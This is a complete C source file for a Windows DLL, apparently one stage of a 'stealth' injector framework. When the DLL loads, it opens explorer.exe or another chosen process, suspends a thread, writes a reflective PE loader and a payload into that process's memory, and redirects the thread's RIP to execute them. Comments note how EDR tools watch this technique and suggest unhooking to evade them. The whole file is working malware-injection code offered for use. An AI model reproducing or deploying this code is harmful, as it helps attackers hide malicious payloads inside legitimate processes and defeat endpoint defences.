// STEALTH Thread Hijacking Injection
// Stage: PREINJECT
// Rating: ★★★★☆
//
// Technique: Suspend thread → Get context → Redirect RIP to loader → Resume
// Uses existing thread, no new thread creation detected.
//
// WARNING: EDRs monitor SetThreadContext heavily. Combine with unhooking if
// needed.

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>


// NT Types
typedef LONG NTSTATUS;
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

// Thread enumeration
#define TH32CS_SNAPPROCESS 0x00000002
#define TH32CS_SNAPTHREAD 0x00000004

typedef struct tagPROCESSENTRY32 {
  DWORD dwSize;
  DWORD cntUsage;
  DWORD th32ProcessID;
  ULONG_PTR th32DefaultHeapID;
  DWORD th32ModuleID;
  DWORD cntThreads;
  DWORD th32ParentProcessID;
  LONG pcPriClassBase;
  DWORD dwFlags;
  CHAR szExeFile[260];
} PROCESSENTRY32, *LPPROCESSENTRY32;

typedef struct tagTHREADENTRY32 {
  DWORD dwSize;
  DWORD cntUsage;
  DWORD th32ThreadID;
  DWORD th32OwnerProcessID;
  LONG tpBasePri;
  LONG tpDeltaPri;
  DWORD dwFlags;
} THREADENTRY32, *LPTHREADENTRY32;

typedef HANDLE(WINAPI *fnCreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL(WINAPI *fnProcess32First)(HANDLE, LPPROCESSENTRY32);
typedef BOOL(WINAPI *fnProcess32Next)(HANDLE, LPPROCESSENTRY32);
typedef BOOL(WINAPI *fnThread32First)(HANDLE, LPTHREADENTRY32);
typedef BOOL(WINAPI *fnThread32Next)(HANDLE, LPTHREADENTRY32);

// Syscall types
typedef NTSTATUS(NTAPI *pfnNtAllocateVirtualMemory)(HANDLE, PVOID *, ULONG_PTR,
                                                    PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI *pfnNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T,
                                                 PSIZE_T);
typedef NTSTATUS(NTAPI *pfnNtSuspendThread)(HANDLE, PULONG);
typedef NTSTATUS(NTAPI *pfnNtResumeThread)(HANDLE, PULONG);
typedef NTSTATUS(NTAPI *pfnNtGetContextThread)(HANDLE, PCONTEXT);
typedef NTSTATUS(NTAPI *pfnNtSetContextThread)(HANDLE, PCONTEXT);

// Stub API
typedef struct {
  void *data;
  size_t size;
  BOOL is_pe;
  BOOL in_memory_mode;
} StealthPayload;
typedef StealthPayload *(*pfnGetPayload)(void);
typedef void (*pfnSetInjectionHandled)(void);

static pfnGetPayload g_GetPayload = NULL;
static pfnSetInjectionHandled g_SetInjectionHandled = NULL;
static int g_debug = 0;
static char g_target_process[MAX_PATH] = "explorer.exe";

// Syscall pointers
static pfnNtAllocateVirtualMemory pNtAllocateVirtualMemory = NULL;
static pfnNtWriteVirtualMemory pNtWriteVirtualMemory = NULL;
static pfnNtSuspendThread pNtSuspendThread = NULL;
static pfnNtResumeThread pNtResumeThread = NULL;
static pfnNtGetContextThread pNtGetContextThread = NULL;
static pfnNtSetContextThread pNtSetContextThread = NULL;

static void init_config() {
  char *debug = getenv("STEALTH_INJECTOR_DEBUG");
  g_debug = (debug && debug[0]);
  char target[MAX_PATH] = {0};
  if (GetEnvironmentVariableA("STEALTH_INJECT_TARGET", target, MAX_PATH) > 0 &&
      target[0])
    strncpy(g_target_process, target, MAX_PATH - 1);
}

static void log_msg(const char *msg) {
  if (!g_debug)
    return;
  char path[MAX_PATH];
  GetTempPathA(sizeof(path), path);
  strcat(path, "stealth_injector.log");
  FILE *f = fopen(path, "a");
  if (f) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    fprintf(f, "[%02d:%02d:%02d] [THREADHIJACK] %s\n", st.wHour, st.wMinute,
            st.wSecond, msg);
    fclose(f);
  }
}

static BOOL ResolveStubExports(void) {
  HMODULE hStub = GetModuleHandleA(NULL);
  if (!hStub)
    return FALSE;
  g_GetPayload = (pfnGetPayload)GetProcAddress(hStub, "stealth_get_payload");
  g_SetInjectionHandled = (pfnSetInjectionHandled)GetProcAddress(
      hStub, "stealth_set_injection_handled");
  return (g_GetPayload != NULL);
}

static BOOL ResolveSyscalls(void) {
  HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
  if (!hNtdll)
    return FALSE;

  pNtAllocateVirtualMemory = (pfnNtAllocateVirtualMemory)GetProcAddress(
      hNtdll, "NtAllocateVirtualMemory");
  pNtWriteVirtualMemory =
      (pfnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
  pNtSuspendThread =
      (pfnNtSuspendThread)GetProcAddress(hNtdll, "NtSuspendThread");
  pNtResumeThread = (pfnNtResumeThread)GetProcAddress(hNtdll, "NtResumeThread");
  pNtGetContextThread =
      (pfnNtGetContextThread)GetProcAddress(hNtdll, "NtGetContextThread");
  pNtSetContextThread =
      (pfnNtSetContextThread)GetProcAddress(hNtdll, "NtSetContextThread");

  return pNtAllocateVirtualMemory && pNtWriteVirtualMemory &&
         pNtSuspendThread && pNtResumeThread && pNtGetContextThread &&
         pNtSetContextThread;
}

static DWORD FindProcessByName(const char *processName) {
  HMODULE hK32 = GetModuleHandleA("kernel32.dll");
  fnCreateToolhelp32Snapshot pSnap = (fnCreateToolhelp32Snapshot)GetProcAddress(
      hK32, "CreateToolhelp32Snapshot");
  fnProcess32First pFirst =
      (fnProcess32First)GetProcAddress(hK32, "Process32First");
  fnProcess32Next pNext =
      (fnProcess32Next)GetProcAddress(hK32, "Process32Next");
  if (!pSnap || !pFirst || !pNext)
    return 0;

  HANDLE hSnap = pSnap(TH32CS_SNAPPROCESS, 0);
  if (hSnap == INVALID_HANDLE_VALUE)
    return 0;

  PROCESSENTRY32 pe = {.dwSize = sizeof(pe)};
  DWORD pid = 0;
  if (pFirst(hSnap, &pe)) {
    do {
      if (_stricmp(pe.szExeFile, processName) == 0) {
        pid = pe.th32ProcessID;
        break;
      }
    } while (pNext(hSnap, &pe));
  }
  CloseHandle(hSnap);
  return pid;
}

static DWORD FindThreadInProcess(DWORD processId) {
  HMODULE hK32 = GetModuleHandleA("kernel32.dll");
  fnCreateToolhelp32Snapshot pSnap = (fnCreateToolhelp32Snapshot)GetProcAddress(
      hK32, "CreateToolhelp32Snapshot");
  fnThread32First pFirst =
      (fnThread32First)GetProcAddress(hK32, "Thread32First");
  fnThread32Next pNext = (fnThread32Next)GetProcAddress(hK32, "Thread32Next");
  if (!pSnap || !pFirst || !pNext)
    return 0;

  HANDLE hSnap = pSnap(TH32CS_SNAPTHREAD, 0);
  if (hSnap == INVALID_HANDLE_VALUE)
    return 0;

  THREADENTRY32 te = {.dwSize = sizeof(te)};
  DWORD tid = 0;
  if (pFirst(hSnap, &te)) {
    do {
      if (te.th32OwnerProcessID == processId) {
        tid = te.th32ThreadID;
        break;
      }
    } while (pNext(hSnap, &te));
  }
  CloseHandle(hSnap);
  return tid;
}

// Reflective loader context
typedef struct {
  void *peBase;
  size_t peSize;
  LPVOID pLoadLibraryA, pGetProcAddress, pVirtualAlloc, pVirtualProtect,
      pExitThread;
  ULONGLONG originalRip; // Return address after loader completes
} ReflectiveContextHijack;

// Same reflective loader (inline for thread hijack)
static DWORD WINAPI ReflectiveLoader(ReflectiveContextHijack *ctx) {
  typedef HMODULE(WINAPI * pLLA)(LPCSTR);
  typedef FARPROC(WINAPI * pGPA)(HMODULE, LPCSTR);
  typedef LPVOID(WINAPI * pVA)(LPVOID, SIZE_T, DWORD, DWORD);

  pLLA fnLL = (pLLA)ctx->pLoadLibraryA;
  pGPA fnGPA = (pGPA)ctx->pGetProcAddress;
  pVA fnVA = (pVA)ctx->pVirtualAlloc;

  unsigned char *peData = (unsigned char *)ctx->peBase;
  PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)peData;
  if (dos->e_magic != 0x5A4D)
    return 1;
  PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(peData + dos->e_lfanew);
  if (nt->Signature != 0x00004550)
    return 2;

  DWORD imgSz = nt->OptionalHeader.SizeOfImage;
  LPVOID base = fnVA((LPVOID)nt->OptionalHeader.ImageBase, imgSz,
                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (!base)
    base = fnVA(NULL, imgSz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (!base)
    return 3;

  for (DWORD i = 0; i < nt->OptionalHeader.SizeOfHeaders; i++)
    ((char *)base)[i] = peData[i];
  PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
  for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++)
    if (sec[i].SizeOfRawData)
      for (DWORD j = 0; j < sec[i].SizeOfRawData; j++)
        ((char *)base + sec[i].VirtualAddress)[j] =
            (peData + sec[i].PointerToRawData)[j];

  ULONGLONG delta = (ULONGLONG)base - nt->OptionalHeader.ImageBase;
  if (delta &&
      nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
    PIMAGE_BASE_RELOCATION rel =
        (PIMAGE_BASE_RELOCATION)((char *)base +
                                 nt->OptionalHeader
                                     .DataDirectory
                                         [IMAGE_DIRECTORY_ENTRY_BASERELOC]
                                     .VirtualAddress);
    while (rel->VirtualAddress) {
      WORD *data = (WORD *)(rel + 1);
      for (DWORD i = 0; i < (rel->SizeOfBlock - 8) / 2; i++) {
        if ((data[i] >> 12) == 10)
          *(ULONGLONG *)((char *)base + rel->VirtualAddress +
                         (data[i] & 0xFFF)) += delta;
        else if ((data[i] >> 12) == 3)
          *(DWORD *)((char *)base + rel->VirtualAddress + (data[i] & 0xFFF)) +=
              (DWORD)delta;
      }
      rel = (PIMAGE_BASE_RELOCATION)((char *)rel + rel->SizeOfBlock);
    }
  }

  if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
    PIMAGE_IMPORT_DESCRIPTOR imp =
        (PIMAGE_IMPORT_DESCRIPTOR)((char *)base +
                                   nt->OptionalHeader
                                       .DataDirectory
                                           [IMAGE_DIRECTORY_ENTRY_IMPORT]
                                       .VirtualAddress);
    while (imp->Name) {
      HMODULE dll = fnLL((char *)base + imp->Name);
      if (dll) {
        PIMAGE_THUNK_DATA thunk =
            (PIMAGE_THUNK_DATA)((char *)base + imp->FirstThunk);
        PIMAGE_THUNK_DATA orig =
            imp->OriginalFirstThunk
                ? (PIMAGE_THUNK_DATA)((char *)base + imp->OriginalFirstThunk)
                : thunk;
        while (orig->u1.AddressOfData) {
          if (orig->u1.Ordinal & IMAGE_ORDINAL_FLAG)
            thunk->u1.Function =
                (ULONGLONG)fnGPA(dll, (LPCSTR)(orig->u1.Ordinal & 0xFFFF));
          else {
            PIMAGE_IMPORT_BY_NAME ibn =
                (PIMAGE_IMPORT_BY_NAME)((char *)base + orig->u1.AddressOfData);
            // Hook ExitProcess
            if (ibn->Name[0] == 'E' && ibn->Name[1] == 'x' &&
                ibn->Name[2] == 'i' && ibn->Name[3] == 't' &&
                ibn->Name[4] == 'P' && ibn->Name[5] == 'r' &&
                ibn->Name[6] == 'o' && ibn->Name[7] == 'c' &&
                ibn->Name[8] == 'e' && ibn->Name[9] == 's' &&
                ibn->Name[10] == 's' && ibn->Name[11] == 0)
              thunk->u1.Function = (ULONGLONG)ctx->pExitThread;
            else
              thunk->u1.Function = (ULONGLONG)fnGPA(dll, ibn->Name);
          }
          thunk++;
          orig++;
        }
      }
      imp++;
    }
  }

  typedef BOOL(WINAPI * DM)(HINSTANCE, DWORD, LPVOID);
  DM ep = (DM)((char *)base + nt->OptionalHeader.AddressOfEntryPoint);
  if (nt->FileHeader.Characteristics & IMAGE_FILE_DLL)
    ep((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
  else
    ((void (*)(void))ep)();

  return 0;
}

static void ReflectiveLoaderEnd(void) {}

static BOOL PerformThreadHijack(StealthPayload *payload) {
  char buf[512];
  HANDLE hProcess = NULL, hThread = NULL;

  log_msg("Starting Thread Hijacking injection");

  DWORD targetPid = FindProcessByName(g_target_process);
  if (!targetPid) {
    sprintf(buf, "Target '%s' not found", g_target_process);
    log_msg(buf);
    return FALSE;
  }
  sprintf(buf, "Target PID: %lu", (unsigned long)targetPid);
  log_msg(buf);

  DWORD targetTid = FindThreadInProcess(targetPid);
  if (!targetTid) {
    log_msg("No thread found in target");
    return FALSE;
  }
  sprintf(buf, "Target TID: %lu", (unsigned long)targetTid);
  log_msg(buf);

  hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
  if (!hProcess) {
    sprintf(buf, "OpenProcess failed: %lu", GetLastError());
    log_msg(buf);
    return FALSE;
  }

  hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, targetTid);
  if (!hThread) {
    sprintf(buf, "OpenThread failed: %lu", GetLastError());
    log_msg(buf);
    CloseHandle(hProcess);
    return FALSE;
  }

  // Suspend thread
  ULONG suspendCount;
  NTSTATUS status = pNtSuspendThread(hThread, &suspendCount);
  if (!NT_SUCCESS(status)) {
    sprintf(buf, "NtSuspendThread failed: 0x%08lX", status);
    log_msg(buf);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return FALSE;
  }
  log_msg("Thread suspended");

  // Get context
  CONTEXT ctx = {0};
  ctx.ContextFlags = CONTEXT_FULL;
  status = pNtGetContextThread(hThread, &ctx);
  if (!NT_SUCCESS(status)) {
    sprintf(buf, "NtGetContextThread failed: 0x%08lX", status);
    log_msg(buf);
    pNtResumeThread(hThread, &suspendCount);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return FALSE;
  }
  sprintf(buf, "Original RIP: 0x%llX", (unsigned long long)ctx.Rip);
  log_msg(buf);

  // Allocate remote memory
  size_t loaderSize =
      (size_t)((char *)ReflectiveLoaderEnd - (char *)ReflectiveLoader);
  size_t totalSize =
      loaderSize + sizeof(ReflectiveContextHijack) + payload->size + 0x1000;

  PVOID remoteBase = NULL;
  SIZE_T regionSize = totalSize;
  status = pNtAllocateVirtualMemory(hProcess, &remoteBase, 0, &regionSize,
                                    MEM_COMMIT | MEM_RESERVE,
                                    PAGE_EXECUTE_READWRITE);
  if (!NT_SUCCESS(status)) {
    sprintf(buf, "Alloc failed: 0x%08lX", status);
    log_msg(buf);
    pNtResumeThread(hThread, &suspendCount);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return FALSE;
  }
  sprintf(buf, "Allocated at %p", remoteBase);
  log_msg(buf);

  PVOID remoteLoader = remoteBase;
  PVOID remoteCtx = (char *)remoteBase + loaderSize + 64;
  PVOID remotePE = (char *)remoteCtx + sizeof(ReflectiveContextHijack) + 64;

  // Prepare context
  ReflectiveContextHijack rctx = {0};
  rctx.peBase = remotePE;
  rctx.peSize = payload->size;
  rctx.pLoadLibraryA =
      (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
  rctx.pGetProcAddress = (LPVOID)GetProcAddress(
      GetModuleHandleA("kernel32.dll"), "GetProcAddress");
  rctx.pVirtualAlloc =
      (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc");
  rctx.pVirtualProtect = (LPVOID)GetProcAddress(
      GetModuleHandleA("kernel32.dll"), "VirtualProtect");
  rctx.pExitThread =
      (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "ExitThread");
  rctx.originalRip = ctx.Rip; // Save for potential return

  // Write to remote
  SIZE_T written;
  pNtWriteVirtualMemory(hProcess, remoteLoader, ReflectiveLoader, loaderSize,
                        &written);
  pNtWriteVirtualMemory(hProcess, remoteCtx, &rctx, sizeof(rctx), &written);
  pNtWriteVirtualMemory(hProcess, remotePE, payload->data, payload->size,
                        &written);
  log_msg("Wrote loader, context, PE");

  // Hijack: Set RIP to our loader, RCX to context (first arg)
  ctx.Rip = (DWORD64)remoteLoader;
  ctx.Rcx = (DWORD64)remoteCtx;

  status = pNtSetContextThread(hThread, &ctx);
  if (!NT_SUCCESS(status)) {
    sprintf(buf, "NtSetContextThread failed: 0x%08lX", status);
    log_msg(buf);
    pNtResumeThread(hThread, &suspendCount);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return FALSE;
  }
  sprintf(buf, "Hijacked RIP to %p", remoteLoader);
  log_msg(buf);

  // Resume thread
  status = pNtResumeThread(hThread, &suspendCount);
  if (!NT_SUCCESS(status)) {
    sprintf(buf, "NtResumeThread failed: 0x%08lX", status);
    log_msg(buf);
  }

  log_msg("Thread resumed - payload executing");

  CloseHandle(hThread);
  CloseHandle(hProcess);

  log_msg("SUCCESS: Thread Hijacking injection complete");
  return TRUE;
}

static BOOL PerformInjection(void) {
  log_msg("=== Thread Hijacking Injector Starting ===");
  if (!ResolveSyscalls()) {
    log_msg("Failed to resolve syscalls");
    return FALSE;
  }
  if (!ResolveStubExports()) {
    log_msg("Failed to resolve stub exports");
    return FALSE;
  }

  StealthPayload *payload = g_GetPayload();
  if (!payload) {
    log_msg("No payload");
    return FALSE;
  }
  if (!payload->is_pe) {
    log_msg("Thread hijack requires PE payload");
    return FALSE;
  }

  char buf[256];
  sprintf(buf, "Payload: %zu bytes", payload->size);
  log_msg(buf);

  if (PerformThreadHijack(payload)) {
    if (g_SetInjectionHandled) {
      g_SetInjectionHandled();
      log_msg("Signaled injection handled");
    }
    return TRUE;
  }
  return FALSE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
  if (fdwReason == DLL_PROCESS_ATTACH) {
    DisableThreadLibraryCalls(hinstDLL);
    init_config();
    log_msg("Thread Hijacking Injector loaded");
    PerformInjection();
  }
  return TRUE;
}
